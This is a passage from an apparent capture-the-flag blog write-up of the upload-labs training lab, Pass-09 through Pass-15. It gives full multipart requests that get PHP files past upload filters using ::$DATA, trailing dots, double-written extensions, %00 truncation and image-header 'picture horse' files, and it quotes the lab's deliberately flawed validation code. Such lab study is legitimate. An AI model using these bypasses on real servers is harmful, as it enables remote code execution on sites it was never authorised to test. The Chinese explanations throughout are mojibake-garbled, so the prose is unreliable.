<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload/upload-labs/Pass-09/index.php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">287032381131322</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php	&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">287032381131322</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">287032381131322</span>--</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹åç«¯ï¼Œçœ‹åˆ°ä¸­é—´æ•°æ®å¾—æµåŠ¨</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>file_ext:.php::$data<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>temp_file:C:\Windows\php67CE.tmp<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>img_path../upload/202202282241383659.php::$data<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åè®¿é—®å›¾ç‰‡<br><img src="/2022/02/28/upload-labs/2022-02-28-22-45-56.png"></p>
<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-æ”¹åŒ…åŠ  <code>. .</code> ç»•è¿‡</strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ä½¿ç”¨<code>1.php. .</code> è¿™ä¸ªæ–¹å¼ç»•è¿‡</p>
<p>POST DATA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">30333176734664</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php. .&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">30333176734664</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">30333176734664</span>--</span><br></pre></td></tr></table></figure>
<p>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-23-13-35.png"></p>
<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-åŒå†™ç»•è¿‡</strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>
<p>åç«¯ç›´æ¥æ›¿æ¢æ‰äº†å…³é”®å­—ï¼Œè€Œä¸”æ˜¯å¿½ç•¥å¤§å°çš„<br>ä½¿ç”¨åŒå†™ç»•è¿‡</p>
<p>POST DATA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">15141771128253</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.pphphp&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">15141771128253</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">15141771128253</span>--</span><br></pre></td></tr></table></figure>
<p>è®¿é—®</p>
<p><img src="/2022/02/28/upload-labs/2022-02-28-23-20-04.png"></p>
<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><strong>æœåŠ¡ç«¯-ç™½åå•æ£€æŸ¥-GET %00æˆªæ–­ç»•è¿‡</strong>   </p>
<p>%00æˆªæ–­åˆ©ç”¨éœ€è¦æœ‰ä»¥ä¸‹æ¡ä»¶</p>
<blockquote>
<p>phpç‰ˆæœ¬å°äº5.3.4<br>phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€   </p>
</blockquote>
<p>æ‰€ä»¥è¿™ä½¿ç”¨PHP5.2.17<br>POST DATA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/upload-labs/Pass-<span class="number">12</span>/index.php?save_path=../upload/<span class="number">1.</span>php%<span class="number">00</span> HTTP/<span class="number">1.1</span></span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">326623275720037</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.png&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">326623275720037</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">326623275720037</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åç«¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å› ä¸º<code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>ä»¥åŠ%00åˆæ˜¯æˆªæ–­ç¬¦ï¼Œæ‰€ä»¥img_pathå˜æˆäº†..&#x2F;upload&#x2F;1.php </p>
<p>ç„¶åå› ä¸ºä½¿ç”¨çš„æ˜¯<code>move_uploaded_file($temp_file,$img_path))</code>ï¼Œæ‰€ä»¥æŠŠ1.pngæ”¾è¿›äº†..&#x2F;upload&#x2F;1.phpï¼ŒæˆåŠŸç»•è¿‡</p>
<p><img src="/2022/02/28/upload-labs/2022-02-28-23-38-11.png"></p>
<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><strong>æœåŠ¡ç«¯-ç™½åå•æ£€æŸ¥-POST %00æˆªæ–­ç»•è¿‡</strong>    </p>
<p>åŸç†åŒPass-12ï¼Œéƒ½æ˜¯åœ¨æ‹¼æ¥æ—¶æ£€æŸ¥ä¸ä¸¥ï¼Œè¿™é‡Œä½¿ç”¨%00ä¸è¡Œï¼ŒPOSTä¸ä¼šæŠŠ%00è§£ææˆ0x00å­—èŠ‚ï¼Œæ‰€ä»¥ç›´æ¥ç”¨burpçš„hexä¿®æ”¹ã€‚</p>
<p><img src="/2022/02/28/upload-labs/2022-03-01-08-57-48.png">   </p>
<p>POAT DATA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;save_path&quot;</span></span><br><span class="line"></span><br><span class="line">../upload/<span class="number">1.</span>php</span><br><span class="line">-----------------------------<span class="number">2995119424827</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.png&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">2995119424827</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">2995119424827</span>--</span><br></pre></td></tr></table></figure>
<p>è®¿é—®å¾—<br><img src="/2022/02/28/upload-labs/2022-03-01-08-59-09.png"></p>
<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><strong>æœåŠ¡ç«¯-æ–‡ä»¶å¤´æ£€æŸ¥-å›¾ç‰‡é©¬ç»•è¿‡</strong><br>å…³é”®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$bin</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//æµ‹è¯•</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]); <span class="comment">//æ‹¼æ¥ä¸¤ä¸ªå­—ç¬¦çš„æ•´æ•°å€¼ </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;	<span class="comment">//æµ‹è¯•</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;	<span class="comment">//æµ‹è¯•</span></span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    	</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line">æ ¹æ®æç¤ºï¼Œè®¾è®¡ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œç„¶ååŒ…å«å³å¯</span><br><span class="line">![](./upload-labs/<span class="number">2022</span>-<span class="number">03</span>-<span class="number">01</span>-<span class="number">15</span>-<span class="number">51</span>-<span class="number">48</span>.png)</span><br><span class="line"></span><br><span class="line">ä¸Šä¼ ä¹‹åï¼Œè®¿é—®åŒ…å«</span><br><span class="line"></span><br><span class="line">![](./upload-labs/<span class="number">2022</span>-<span class="number">03</span>-<span class="number">01</span>-<span class="number">15</span>-<span class="number">53</span>-<span class="number">56</span>.png)</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥ä½¿ç”¨ copyå‘½ä»¤ï¼Œä¾‹</span><br><span class="line">`copy æ— æ ‡é¢˜.png/b + <span class="number">1</span>.Php test.png`ï¼Œç»æµ‹è¯• `/b`åŠ ä¸åŠ éƒ½å¯ä»¥    </span><br><span class="line"></span><br><span class="line">ä¸Šä¼ å³å¯</span><br><span class="line"></span><br><span class="line">![](./upload-labs/<span class="number">2022</span>-<span class="number">03</span>-<span class="number">01</span>-<span class="number">16</span>-<span class="number">07</span>-<span class="number">17</span>.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**è¡¥å……çŸ¥è¯†ï¼š**</span><br><span class="line">```python</span><br><span class="line"></span><br><span class="line">COPY  [/D] [/V] [/N] [/Y | /-Y] [/Z] [/L] [/A | /B ]  source  [/A | /B]  [+ source [/A | /B] [+ ...]]  [destination [/A | /B]]</span><br><span class="line"></span><br><span class="line">  source        æŒ‡å®šè¦å¤åˆ¶çš„æ–‡ä»¶ã€‚</span><br><span class="line">  /A            è¡¨ç¤ºä¸€ä¸ª ASCII æ–‡æœ¬æ–‡ä»¶ã€‚</span><br><span class="line">  /B            è¡¨ç¤ºä¸€ä¸ªäºŒè¿›ä½æ–‡ä»¶ã€‚</span><br><span class="line">  /D            å…è®¸è§£å¯†è¦åˆ›å»ºçš„ç›®æ ‡æ–‡ä»¶</span><br><span class="line">  destination   ä¸ºæ–°æ–‡ä»¶æŒ‡å®šç›®å½•å’Œ/æˆ–æ–‡ä»¶åã€‚</span><br><span class="line">  /V            éªŒè¯æ–°æ–‡ä»¶å†™å…¥æ˜¯å¦æ­£ç¡®ã€‚</span><br><span class="line">  /N            å¤åˆ¶å¸¦æœ‰é <span class="number">8</span>dot3 åç§°çš„æ–‡ä»¶æ—¶ï¼Œå°½å¯èƒ½ä½¿ç”¨çŸ­æ–‡ä»¶åã€‚</span><br><span class="line">  /Y            ä¸ä½¿ç”¨ç¡®è®¤æ˜¯å¦è¦è¦†ç›–ç°æœ‰ç›®æ ‡æ–‡ä»¶çš„æç¤ºã€‚</span><br><span class="line">  /-Y           ä½¿ç”¨ç¡®è®¤æ˜¯å¦è¦è¦†ç›–ç°æœ‰ç›®æ ‡æ–‡ä»¶çš„æç¤ºã€‚</span><br><span class="line">  /Z            ç”¨å¯é‡æ–°å¯åŠ¨æ¨¡å¼å¤åˆ¶å·²è”ç½‘çš„æ–‡ä»¶ã€‚</span><br><span class="line">  /L            å¦‚æœæºæ˜¯ç¬¦å·é“¾æ¥ï¼Œè¯·å°†é“¾æ¥å¤åˆ¶åˆ°ç›®æ ‡è€Œä¸æ˜¯æºé“¾æ¥æŒ‡å‘çš„å®é™…æ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><strong>æœåŠ¡ç«¯-getimagesizeæ£€æŸ¥-å›¾ç‰‡é©¬ç»•è¿‡</strong></p>
<p>getimagesize â€” å–å¾—å›¾åƒå¤§å°</p>
<p>getimagesize(string $filename, array &amp;$imageinfo &#x3D; ?): array<br>getimagesize() å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹å’Œä¸€ä¸ªå¯ä»¥ç”¨äºæ™®é€š HTML æ–‡ä»¶ä¸­ IMG æ ‡è®°ä¸­çš„ height&#x2F;width æ–‡æœ¬å­—ç¬¦ä¸²ã€‚<br>å¦‚æœä¸èƒ½è®¿é—® filename æŒ‡å®šçš„å›¾åƒæˆ–è€…å…¶ä¸æ˜¯æœ‰æ•ˆçš„å›¾åƒï¼Œgetimagesize() å°†è¿”å› false å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ã€‚<br>è¿”å›ä¸€ä¸ªå…·æœ‰å››ä¸ªå•å…ƒçš„æ•°ç»„ã€‚ç´¢å¼• 0 åŒ…å«å›¾åƒå®½åº¦çš„åƒç´ å€¼ï¼Œç´¢å¼• 1 åŒ…å«å›¾åƒé«˜åº¦çš„åƒç´ å€¼ã€‚ç´¢å¼• 2 æ˜¯å›¾åƒç±»å‹çš„æ ‡è®°ï¼š1 &#x3D; GIFï¼Œ2 &#x3D; JPGï¼Œ3 &#x3D; PNGï¼Œ4 &#x3D; SWFï¼Œ5 &#x3D; PSDï¼Œ6 &#x3D; BMPï¼Œ7 &#x3D; TIFF(intel byte order)ï¼Œ8 &#x3D; TIFF(motorola byte order)ï¼Œ9 &#x3D; JPCï¼Œ10 &#x3D; JP2ï¼Œ11 &#x3D; JPXï¼Œ12 &#x3D; JB2ï¼Œ13 &#x3D; SWCï¼Œ14 &#x3D; IFFï¼Œ15 &#x3D; WBMPï¼Œ16 &#x3D; XBMã€‚è¿™äº›æ ‡è®°ä¸ PHP 4.3.0 æ–°åŠ çš„ IMAGETYPE å¸¸é‡å¯¹åº”ã€‚ç´¢å¼• 3 æ˜¯æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œå†…å®¹ä¸ºâ€œheight&#x3D;â€yyyâ€ width&#x3D;â€xxxâ€â€ï¼Œå¯ç›´æ¥ç”¨äº IMG æ ‡è®°ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);<span class="comment">//è·å–å›¾ç‰‡ä¿¡æ¯</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);<span class="comment">//æå–å›¾ç‰‡ç±»å‹</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;<span class="comment">//æ˜¯å¦ä¸ºç¬¦åˆç™½åå•</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
